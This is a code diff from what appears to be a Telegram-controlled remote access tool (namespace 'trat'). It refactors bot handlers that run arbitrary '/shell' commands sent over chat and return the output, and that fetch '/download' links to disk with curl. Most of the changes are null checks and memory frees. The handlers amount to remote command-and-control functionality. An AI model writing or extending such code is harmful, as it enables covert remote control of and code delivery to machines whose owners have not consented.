@@ -12,7 +12,6 @@ namespace trat
     {
       return false;
     }
-    
     parser::PrefixSuffix *p_prefix_and_suffix = parser::breakDownWord(Message, " ");
     if (p_prefix_and_suffix == nullptr)
     {
@@ -47,17 +46,26 @@ namespace trat
   }
   void Bot::handleTextBasedCommand(const char* Telegram_Message_Text, const char* Command,  char* Shell_Function_Callback_Result)
   {
-    if (strstr(Telegram_Message_Text, Command))
+    if ((Telegram_Message_Text != nullptr)&&(Command != nullptr)&&(Shell_Function_Callback_Result != nullptr))
     {
-      this->sendMessage(Shell_Function_Callback_Result);
+      if (strstr(Telegram_Message_Text, Command))
+      {
+        /* Aliasing  the pointer */
+        char* function_result = Shell_Function_Callback_Result;
+        this->sendMessage(function_result);
+        free(function_result);
+        function_result = nullptr;
+      }
     }
-
   }
   void Bot::handleDownloadCommand(const char* Telegram_Message_Text)
   {
-    if (auto link = parser::extractDownloadLink(Telegram_Message_Text))
+    char* link = parser::checkCommandAndExtractParemeter("/download", Telegram_Message_Text);
+    if (link != nullptr)
     {
-      auto networking_response = trat::networking::curlDownload(link, parser::constructFilePath(link));
+      networking::NetworkingResponse networking_response = trat::networking::curlDownload(link, parser::constructFilePath(link));
+      free(link);
+      link = nullptr;
       char message_buffer[256];
       if (networking_response.isSuccessful)
       {
@@ -71,13 +79,21 @@ namespace trat
   }
   void Bot::handleShellCommand(const char* Telegram_Message_Text)
   {
-    if (auto command = parser::extractShellCommand(Telegram_Message_Text))
+    char* command = parser::checkCommandAndExtractParemeter("/shell", Telegram_Message_Text);
+    if(command != nullptr)
     {
       auto command_result = this -> shell.executeShellCommand(command);
+      free(command);
+      command = nullptr;
       if(command_result.isSuccessful)
       {
         this -> sendMessage(command_result.response);
       }
+      else 
+      {
+        this -> sendMessage("Shell Command failed");
+      }
+      ShellResponse_destroy(&command_result); //Weird thing to do, but makes the code paradoxically make sense;
     }
   }
   void Bot::handleDocuments(telebot_document_t* P_Telebot_Document)
